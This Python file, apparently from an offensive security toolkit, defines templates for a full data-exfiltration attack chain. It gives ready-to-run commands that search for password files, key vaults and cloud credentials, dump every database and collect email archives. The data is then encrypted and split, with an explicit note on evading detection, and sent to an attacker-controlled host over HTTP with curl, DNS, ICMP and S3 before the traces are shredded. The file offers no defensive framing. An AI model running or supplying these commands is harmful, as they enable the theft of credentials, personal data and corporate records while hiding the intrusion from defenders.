"""
Data Exfiltration Attack Templates
"""


class ExfiltrationTemplates:
    """Templates for data exfiltration scenarios"""
    
    @staticmethod
    def data_exfiltration_chain():
        """
        Attack chain for identifying and exfiltrating sensitive data
        Target: Systems with sensitive data access
        """
        return {
            'name': 'Data Exfiltration',
            'description': 'Attack chain for identifying, collecting, and exfiltrating sensitive data',
            'target_type': 'data_targets',
            'difficulty': 'medium',
            'estimated_time': '3-6 hours',
            'prerequisites': ['System access', 'Network connectivity'],
            'phases': [
                ExfiltrationTemplates._data_discovery_phase(),
                ExfiltrationTemplates._data_collection_phase(),
                ExfiltrationTemplates._data_staging_phase(),
                ExfiltrationTemplates._data_exfiltration_phase()
            ]
        }
    
    @staticmethod
    def _data_discovery_phase():
        """Discover sensitive data locations"""
        return {
            'phase': 'data_discovery',
            'name': 'Sensitive Data Discovery',
            'description': 'Locate sensitive files and databases',
            'steps': [
                {
                    'step': 1,
                    'name': 'File System Search',
                    'tool': 'find/grep',
                    'command': 'find / -type f \\( -name "*confidential*" -o -name "*password*" -o -name "*secret*" -o -name "*.kdbx" \\) 2>/dev/null',
                    'expected_output': 'Paths to sensitive files',
                    'success_criteria': 'Located confidential documents',
                    'required_vars': []
                },
                {
                    'step': 2,
                    'name': 'Database Discovery',
                    'tool': '05-post-exploitation/data_exfiltrator.py',
                    'command': 'python3 05-post-exploitation/data_exfiltrator.py --find-databases',
                    'expected_output': 'Database locations and credentials',
                    'success_criteria': 'Identified accessible databases',
                    'required_vars': []
                },
                {
                    'step': 3,
                    'name': 'Cloud Storage Discovery',
                    'tool': 'grep/find',
                    'command': 'grep -r "aws_access_key\\|s3.amazonaws\\|azure" /home /etc --include="*.conf" --include="*.json" 2>/dev/null',
                    'expected_output': 'Cloud storage credentials',
                    'success_criteria': 'Found cloud access keys',
                    'required_vars': []
                },
                {
                    'step': 4,
                    'name': 'Network Share Enumeration',
                    'tool': 'crackmapexec',
                    'command': 'crackmapexec smb {internal_subnet} -u {username} -p {password} --shares',
                    'expected_output': 'Accessible network shares',
                    'success_criteria': 'Identified shared folders with sensitive data',
                    'required_vars': ['internal_subnet', 'username', 'password']
                }
            ]
        }
    
    @staticmethod
    def _data_collection_phase():
        """Collect identified sensitive data"""
        return {
            'phase': 'data_collection',
            'name': 'Data Collection',
            'description': 'Collect and prepare sensitive data',
            'steps': [
                {
                    'step': 1,
                    'name': 'Copy Sensitive Files',
                    'tool': 'cp/robocopy',
                    'command': 'find /home -type f -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf" -exec cp {} /tmp/exfil/ \\; 2>/dev/null',
                    'expected_output': 'Files copied to staging directory',
                    'success_criteria': 'Sensitive documents collected',
                    'required_vars': []
                },
                {
                    'step': 2,
                    'name': 'Database Dump',
                    'tool': 'mysqldump/pg_dump',
                    'command': 'mysqldump -u{db_user} -p{db_pass} --all-databases > /tmp/exfil/database_dump.sql',
                    'expected_output': 'Complete database dump',
                    'success_criteria': 'Database contents exported',
                    'required_vars': ['db_user', 'db_pass']
                },
                {
                    'step': 3,
                    'name': 'Browser History Extraction',
                    'tool': '05-post-exploitation/credential_harvester.py',
                    'command': 'python3 05-post-exploitation/credential_harvester.py --history --output /tmp/exfil/',
                    'expected_output': 'Browser history and bookmarks',
                    'success_criteria': 'User browsing data collected',
                    'required_vars': []
                },
                {
                    'step': 4,
                    'name': 'Email Archive',
                    'tool': 'find/tar',
                    'command': 'find /home -name "*.pst" -o -name "*.mbox" | tar -czf /tmp/exfil/emails.tar.gz -T -',
                    'expected_output': 'Email archives collected',
                    'success_criteria': 'Email data archived',
                    'required_vars': []
                }
            ]
        }
    
    @staticmethod
    def _data_staging_phase():
        """Stage data for exfiltration"""
        return {
            'phase': 'data_staging',
            'name': 'Data Staging',
            'description': 'Compress and prepare data for exfiltration',
            'steps': [
                {
                    'step': 1,
                    'name': 'Compress Data',
                    'tool': 'tar/zip',
                    'command': 'tar -czf /tmp/data_package.tar.gz /tmp/exfil/',
                    'expected_output': 'Compressed archive',
                    'success_criteria': 'Data compressed and ready',
                    'required_vars': []
                },
                {
                    'step': 2,
                    'name': 'Encrypt Archive',
                    'tool': 'openssl/gpg',
                    'command': 'openssl enc -aes-256-cbc -salt -in /tmp/data_package.tar.gz -out /tmp/data_encrypted.bin -k {encryption_key}',
                    'expected_output': 'Encrypted archive',
                    'success_criteria': 'Data encrypted for secure transfer',
                    'required_vars': ['encryption_key']
                },
                {
                    'step': 3,
                    'name': 'Split Archive',
                    'tool': 'split',
                    'command': 'split -b 10M /tmp/data_encrypted.bin /tmp/data_part_',
                    'expected_output': 'Multiple smaller files',
                    'success_criteria': 'Archive split into manageable chunks',
                    'required_vars': [],
                    'optional': True,
                    'notes': 'Useful for evading size-based detection'
                }
            ]
        }
    
    @staticmethod
    def _data_exfiltration_phase():
        """Exfiltrate data from network"""
        return {
            'phase': 'data_exfiltration',
            'name': 'Data Exfiltration',
            'description': 'Transfer data out of target network',
            'steps': [
                {
                    'step': 1,
                    'name': 'HTTP Exfiltration',
                    'tool': 'curl/wget',
                    'command': 'curl -X POST -F "file=@/tmp/data_encrypted.bin" http://{attacker_ip}:{attacker_port}/upload',
                    'expected_output': 'Successful upload',
                    'success_criteria': 'Data transferred to attacker server',
                    'required_vars': ['attacker_ip', 'attacker_port']
                },
                {
                    'step': 2,
                    'name': 'DNS Exfiltration',
                    'tool': 'custom script',
                    'command': 'python3 05-post-exploitation/data_exfiltrator.py --method dns --server {attacker_dns} --file /tmp/data_encrypted.bin',
                    'expected_output': 'Data chunked and sent via DNS',
                    'success_criteria': 'Covert exfiltration completed',
                    'required_vars': ['attacker_dns'],
                    'notes': 'Slower but more covert'
                },
                {
                    'step': 3,
                    'name': 'Cloud Upload',
                    'tool': 'aws cli/azure cli',
                    'command': 'aws s3 cp /tmp/data_encrypted.bin s3://{attacker_bucket}/exfil/ --no-sign-request',
                    'expected_output': 'File uploaded to S3',
                    'success_criteria': 'Data stored in attacker-controlled cloud storage',
                    'required_vars': ['attacker_bucket'],
                    'optional': True
                },
                {
                    'step': 4,
                    'name': 'ICMP Exfiltration',
                    'tool': 'custom script',
                    'command': 'python3 05-post-exploitation/data_exfiltrator.py --method icmp --target {attacker_ip} --file /tmp/data_encrypted.bin',
                    'expected_output': 'Data embedded in ICMP packets',
                    'success_criteria': 'Covert exfiltration via ping',
                    'required_vars': ['attacker_ip'],
                    'optional': True,
                    'notes': 'Very covert but very slow'
                },
                {
                    'step': 5,
                    'name': 'Cleanup',
                    'tool': 'rm/shred',
                    'command': 'shred -vfz -n 3 /tmp/data_* /tmp/exfil/*',
                    'expected_output': 'Files securely deleted',
                    'success_criteria': 'Traces removed from system',
                    'required_vars': []
                }
            ]
        }